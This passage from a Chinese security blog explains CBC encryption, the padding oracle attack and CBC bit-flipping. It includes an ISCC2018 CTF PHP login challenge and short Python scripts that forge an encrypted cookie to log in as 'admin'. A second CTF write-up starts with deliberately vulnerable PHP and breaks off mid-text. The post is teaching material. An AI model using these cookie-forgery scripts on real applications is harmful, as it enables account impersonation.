</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/Padding-oracle-attack%E4%B8%8ECBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E7%9A%84%E9%82%82%E9%80%85/">Padding oracle attack与CBC字节翻转攻击的邂逅</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="CBC加密模式"><a href="#CBC加密模式" class="headerlink" title="CBC加密模式"></a>CBC加密模式</h3><p>加密过程：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34dkdbijfj30go06r3yz.jpg" alt=""></p>
<p>由图可以看出加密过程为：将明文以16字节或者8字节进行分组，对应着也就是AES和DES，不足位数的进行填充，分组填充完毕后，<strong>第一组明文与初始向量IV异或</strong>，并进行<strong>加密生成第一组密文</strong>，<strong>第一组密文和第二组明文进行异或操作，再次进行加密生成第二组密文</strong>，以此类推，将生成的所有密文进行整合，就是所生成的密文。</p>
<p>解密过程：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ecuqifvj30go066mxm.jpg" alt=""></p>
<p>过程与加密类似</p>
<p>也是将密文以16字节或8字节进行分组，<strong>第一组密文先进行解密得到中间量与初始向量进行异或得到第一组明文，然后将第二组密文进行解密后与第一组密文进行异或得到第二组明文</strong>，以此类推，获得所有明文。</p>
<h3 id="Padding-Oracle-Attack攻击"><a href="#Padding-Oracle-Attack攻击" class="headerlink" title="Padding Oracle Attack攻击"></a>Padding Oracle Attack攻击</h3><p>Padding Oracle Attack的攻击主要位于解密过程</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ereldy0j30rk08djte.jpg" alt=""></p>
<p>密文经过解密过程所生成的值为明文与前一个IV向量所异或生成的值，<strong>称为中间值</strong>。</p>
<h4 id="Padding填充规则"><a href="#Padding填充规则" class="headerlink" title="Padding填充规则"></a><strong>Padding填充规则</strong></h4><p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ewywkcjj30ly0c5jro.jpg" alt=""></p>
<p><strong>对于DES</strong>，不足八位则需要填充至八位，填充的每位为缺少位数的十六进制，例如FIG，则每位需要填充的是0x05(如图所示)。</p>
<p><strong>对于AES</strong>，不足十六位的需要填充至十六位，填充的每位为缺少位数的十六进制，如<strong>lihuaiqiu</strong>，则填充为<strong>lihuaiqiu\x07\x07\x07\x07\x07\x07\x07</strong></p>
<h4 id="Padding-oracle-attack攻击原理"><a href="#Padding-oracle-attack攻击原理" class="headerlink" title="Padding oracle attack攻击原理"></a>Padding oracle attack攻击原理</h4><p>Paddding oracle attack为<strong>针对CBC链接模式的攻击</strong>，和DES，AES等加密算法没有关系。</p>
<p><strong>使用CBC模式加密敏感信息的服务器对提交信息的处理方法</strong>：</p>
<p>我们所传递的信息经过CBC加密模式传递给服务器，服务器尝试去解密。</p>
<p>当我们输入一个错误的向量IV，依然可以进行解密，但是最终生成的填充值却是错误的.如本应填充完毕的值为</p>
<p><strong>TEST\x04\x04\x04\x04</strong></p>
<p>通过错误向量IV得到的值为<strong>TEST\x04\x04\x04\x2c</strong>，<strong>而事实上服务器就是通过判断最后一组的填充值来判断是否可以正常解密的</strong>，如果无法进行正常解密，则会<strong>抛出<code>Padding Error</code>,对应着也就会返回302或者500报错，而可以正常解密的情况下返回值是200</strong>。</p>
<p>也就是说可以分为如下几种情况：</p>
<ul>
<li>无法正常解密(返回500或者302)</li>
<li>可以正常解密，密码正确(200)</li>
<li>可以正常解密，密码错误(200)</li>
</ul>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>我们可以知道，明文的是由middle值和上一组的密文也就是IV向量值异或生成的，如下图：</p>
<p><img src="https://image.3001.net/uploads/image/20131028/20131028140730_78503.png" alt="img"></p>
<p>而此时我们只知道的是向量IV的值，<strong>但是我们可以通过输入的向量的IV值和服务器的返回状态来判断middle的值，进一步接触明文的值</strong>。</p>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ul>
<li>先假定明文只填充了一个字节，而后对倒数第二组的密文从<code>0x00</code>-&gt;<code>0xff</code>进行遍历，直到返回的正确状态码200，<strong>代表可以正常解密</strong>。</li>
</ul>
<p>通过公式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Middle[8]^初始IV[8]&#x3D;plain[8]</span><br><span class="line"></span><br><span class="line">Middle[8]^构造IV[8]&#x3D;0x01</span><br></pre></td></tr></table></figure>

<p>可得<strong>plain[8]=0x01^构造IV[8]^初始IV[8]</strong>。</p>
<p><img src="https://image.3001.net/uploads/image/20131028/20131028140812_51657.png" alt="img"></p>
<ul>
<li>再假定明文填充了两个字节，此时需要有一个关键性步骤，<strong>更新构造向量IV的最后一个字节的值</strong>，因为现在我们的是两个0x02，先更新向量IV的最后一个字节的值，因为我们已经知道了原来Middle的最后一个字节的值，所以可以很快的构造出向量IV的最后一个字节的值，公式为<strong>IV[8]=middle[8]^0x02</strong>,</li>
</ul>
<p>然后接着爆破遍历IV[7]的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Middle[7]^初始IV[7]&#x3D;plain[7]</span><br><span class="line"></span><br><span class="line">Middle[7]^构造IV[7]&#x3D;0x02</span><br></pre></td></tr></table></figure>

<p><img src="http://img.zhaojie.me/blog/padding-oracle-attack-in-detail/po_fig9.png" alt="img"></p>
<p>通过同样的方式得到<strong>plain[7]</strong>的值</p>
<ul>
<li>循环此方式，并且<strong>注意向量IV的更新</strong>，最终得到最后一组的明文。</li>
</ul>
<p><img src="http://img.zhaojie.me/blog/padding-oracle-attack-in-detail/po_fig10.png" alt="img"></p>
<ul>
<li><strong>舍弃掉最后一组的密文，只提交第一组到倒数第二组的密文</strong>，通过构造倒数第三组的密文(向量IV)得到倒数第二组的明文,循环此过程，得到全部的明文。</li>
</ul>
<h4 id="攻击成立条件"><a href="#攻击成立条件" class="headerlink" title="攻击成立条件"></a>攻击成立条件</h4><ul>
<li>攻击者能够获得密文，以及附带在密文前面的IV。</li>
<li>攻击者能够触发密文的解密过程。</li>
</ul>
<h3 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h3><p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ecuqifvj30go066mxm.jpg" alt=""></p>
<h4 id="CBC攻击核心思路"><a href="#CBC攻击核心思路" class="headerlink" title="CBC攻击核心思路"></a>CBC攻击核心思路</h4><p>攻击过程仍然为解密过程，不过这里的<strong>核心思路是已知明文，并且利用向量IV去改变解密后的明文，如知道解密后的明文为ktctf，我们想来构造一个IV，使其解密后变成admin(这里最好字母位数要对应)。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">公式：</span><br><span class="line"></span><br><span class="line">初始IV[1]^middle[1]&#x3D;plain[1]</span><br><span class="line"></span><br><span class="line">构造:</span><br><span class="line"></span><br><span class="line">构造IV[1]^middle[1]&#x3D;a</span><br><span class="line"></span><br><span class="line">所以</span><br><span class="line"></span><br><span class="line">构造IV[1]&#x3D;middle[1]^a</span><br><span class="line"></span><br><span class="line">middle[1]&#x3D;plain[1]^初始IV[1]</span><br><span class="line"></span><br><span class="line">最终可得</span><br><span class="line"></span><br><span class="line">构造IV[1]&#x3D;plain[1]^初始IV[1]^a</span><br></pre></td></tr></table></figure>

<p>通过修改IV即可任意达到我们想要修改解密后的数据</p>
<h4 id="Padding-oracle-attack与CBC字节翻转攻击的邂逅"><a href="#Padding-oracle-attack与CBC字节翻转攻击的邂逅" class="headerlink" title="Padding oracle attack与CBC字节翻转攻击的邂逅"></a>Padding oracle attack与CBC字节翻转攻击的邂逅</h4><p>在大体思路上，我们想要更改解密后字符串，是一定要知道具体的明文的，如果是给出部分明文还好，但是在没有明文的情况下，只有密文与初始向量IV该怎么攻击</p>
<p><strong>解决方法</strong>:<strong>利用上述介绍的Padding oracle attack方法换原出所有明文，进而通过明文来修改得到我们想要的数据。</strong></p>
<h4 id="CBC字节翻转攻击实战"><a href="#CBC字节翻转攻击实战" class="headerlink" title="CBC字节翻转攻击实战"></a>CBC字节翻转攻击实战</h4><p>看到比较典型的就是ISCC2018的一道题了，在CBC字节翻转攻击中应该是算很基础的那种了。</p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'sqlwaf.php'</span>;</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"................"</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用aes-128-cbc 模式加密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv=get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));<span class="comment">// cookie[iv] = 随机生成的iv 的base64</span></span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));<span class="comment">// cookie[cipher] = 加密值的base64</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;<span class="comment">//发现当账号为admin，才会显示flag，</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is *************&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解密cipher</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);<span class="comment">//cipher和iv变量均中cookie数组中取</span></span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[<span class="string">'username'</span>]);</span><br><span class="line">  $password=waf((string)$_POST[<span class="string">'password'</span>]);</span><br><span class="line">  <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;You are not real admin!&lt;/p&gt;'</span>);<span class="comment">//当我们以admin账号登录时，程序会直接跳出</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="comment">//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码逻辑分析：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34sq6v97xj30y70madhv.jpg" alt=""></p>
<p>流程：如注册用户为abmin,密码也为abmin,则经过第一次登陆可有(没法复现了，只能借用一下图)</p>
<p>第一次进入可以得到的是IV以及base64加密后的Ciper，还有自己也可以看出反序列化数据</p>
<p><img src="https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/image010.png" alt="è¿éåå¾çæè¿°"></p>
<p>AES为十六字节一组，所以分组情况如下：</p>
<p>a:2:{s:8:”username”;s:5:”abmin”;s:8:”password”;s:5:”abmin”;}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:”userna</span><br><span class="line">me”;s:5:”abmin”;</span><br><span class="line">s:8:”password”;s</span><br><span class="line">:5:”abmin”;&#125;</span><br></pre></td></tr></table></figure>

<p>翻转攻击逻辑，我们要将abmin翻转为admin，所以这里去修改上一组向量也就是<code>s:2:{s:8:”userna</code>来与middle值异或得到翻转后的值<code>me”;s:5:”abmin”;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">公式原理为</span><br><span class="line"></span><br><span class="line">middle[11]&#x3D;Ciper[11]^&#39;b&#39;</span><br><span class="line"></span><br><span class="line">构造Ciper[11]&#x3D;middle[11]^d</span><br><span class="line"></span><br><span class="line">所以</span><br><span class="line"></span><br><span class="line">构造Ciper[11]&#x3D;Ciper[11]^&#39;b&#39;^&#39;d&#39;</span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">nweCipher=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'bp抓到的cipher经过url解密后的值'</span>  </span><br><span class="line">cipher = base64.b64decode(cipher) <span class="comment">#先进行解密</span></span><br><span class="line">newCipher = cipher[<span class="number">0</span>:<span class="number">11</span>] + chr(ord(cipher[<span class="number">11</span>])^ord(<span class="string">'b'</span>)^ord(<span class="string">'d'</span>)) + cipher[<span class="number">12</span>:] <span class="comment">#XOR运算修改</span></span><br><span class="line"><span class="keyword">print</span> base64.b64encode(newCipher)  <span class="comment">#再进行加密</span></span><br></pre></td></tr></table></figure>

<p>将得到的第一组攻击密文经过url编码后填入Cipher</p>
<p><img src="https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/image013.png" alt="è¿éåå¾çæè¿°"></p>
<p>这里返回的代表无法进行反序列化，这是因为我们<strong>构造第一组攻击密文的时候破坏了密文本来的样子，这样经过aes解密后与之前属于正常密文的IV向量异或后就会得到不可见字符明文</strong>，这样就会无法反序列化。</p>
<p>所以，我们要对向量IV也要重新构造出符合攻击密文的向量，并且要一位一位的进行修复，这里可能会产生疑惑，<strong>为什么一位一位的进行修复</strong>，改的是密文的第十一位，只修复向量IV的第十一位不就好了?</p>
<p><strong>原因解释</strong>：</p>
<p><strong>在check_login函数中，函数逻辑是先对密文进行base64解密然后再aes解密，进行base64解密后的密文虽然是只有第十一位字符进行了攻击伪造，但是这个密文进行aes解密后得到的中间值逻辑就都乱了，并非只有中间值的第十一位发生改变，进而和原来的向量IV进行异或，所有得到的前十六位明文有很多乱码字符，而不是只有第十一位出错。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">构造逻辑：</span><br><span class="line">错误middle[i]&#x3D;ciper[i]^原来的IV[i]</span><br><span class="line"></span><br><span class="line">伪造IV[i]&#x3D;错误middle[i]^rightplain[i]</span><br><span class="line"></span><br><span class="line">所以</span><br><span class="line"></span><br><span class="line">伪造IV[i]&#x3D;ciper[i]^原来的IV[i]^rightplain[i]</span><br></pre></td></tr></table></figure>

<p>这里的ciper[i]指的是那串无法进行反序列化的base64加密字段，需要先进行base64解密。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">cipher = <span class="string">''</span><span class="comment">#无法反序列化的字符串</span></span><br><span class="line">iv = <span class="string">''</span><span class="comment">#先前得到的IV</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))<span class="comment">#给cipher解密</span></span><br><span class="line">iv = base64.b64decode(iv) <span class="comment">#给先前的IV解密</span></span><br><span class="line">newIv = <span class="string">''</span></span><br><span class="line">right = <span class="string">''</span><span class="comment">#破坏前正确的字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))<span class="comment">#一位位修复</span></span><br><span class="line">    <span class="keyword">print</span> urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<p><img src="https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/image015.png" alt="è¿éåå¾çæè¿°"></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://virtua11.github.io/2018/07/02/CBC字节翻转攻击/" target="_blank" rel="noopener">https://virtua11.github.io/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p>
<p><a href="https://skysec.top/2017/06/16/CBC字节翻转攻击/" target="_blank" rel="noopener">https://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p>
<p><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/151167.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/Padding-oracle-attack%E4%B8%8ECBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E7%9A%84%E9%82%82%E9%80%85/" data-id="ckabsu38b001ikkvrgwcpftwr" class="article-share-link" data-share="baidu" data-title="Padding oracle attack与CBC字节翻转攻击的邂逅">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/Padding-oracle-attack%E4%B8%8ECBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E7%9A%84%E9%82%82%E9%80%85/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-第十二届信息安全竞赛部分wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/" class="article-date">
  <time datetime="2019-06-01T08:49:14.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/">第十二届信息安全竞赛部分wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h2><p>通过php伪协议可以读取到hint.php源码和index.php源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">hint.php</span><br><span class="line">&lt;?php</span><br><span class="line"> class Handle&#123;</span><br><span class="line"> private $handle;</span><br><span class="line"> public function __wakeup()&#123;</span><br><span class="line"> foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line"> $this-&gt;$k &#x3D; null;</span><br><span class="line"> &#125;</span><br><span class="line"> echo &quot;Waking up\n&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __construct($handle) &#123;</span><br><span class="line"> $this-&gt;handle &#x3D; $handle;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __destruct()&#123;</span><br><span class="line"> $this-&gt;handle-&gt;getFlag();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line"> public $file;</span><br><span class="line"> public $token;</span><br><span class="line"> public $token_flag;</span><br><span class="line"></span><br><span class="line">function __construct($file)&#123;</span><br><span class="line"> $this-&gt;file &#x3D; $file;</span><br><span class="line"> $this-&gt;token_flag &#x3D; $this-&gt;token &#x3D; md5(rand(1,10000));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">public function getFlag()&#123;</span><br><span class="line"> $this-&gt;token_flag &#x3D; md5(rand(1,10000));</span><br><span class="line"> if($this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;token_flag)</span><br><span class="line"> &#123;</span><br><span class="line"> if(isset($this-&gt;file))&#123;</span><br><span class="line"> echo @highlight_file($this-&gt;file,true);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line">index.php</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line"> error_reporting(0);</span><br><span class="line"> $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line"> $payload &#x3D; $_GET[&quot;payload&quot;];</span><br><span class="line"> if(!isset($file))&#123;</span><br><span class="line"> echo &#39;Missing parameter&#39;.&#39;&lt;br&gt;&#39;;</span><br><span class="line"> &#125;</span><br><span class="line"> if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line"> die(&#39;hack attacked!!!&#39;);</span><br><span class="line"> &#125;</span><br><span class="line"> @include($file);</span><br><span class="line"> if(isset($payload))&#123;</span><br><span class="line"> $url &#x3D; parse_url($_SERVER[&#39;REQUEST_URI&#39;]);</span><br><span class="line"> parse_str($url[&#39;query&#39;],$query);</span><br><span class="line"> foreach($query as $value)&#123;</span><br><span class="line"> if (preg_match(&quot;&#x2F;flag&#x2F;&quot;,$value)) &#123;</span><br><span class="line"> die(&#39;stop hacking!&#39;);</span><br><span class="line"> exit();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $payload &#x3D; unserialize($payload);</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> echo &quot;Missing parameters&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;!--Please test 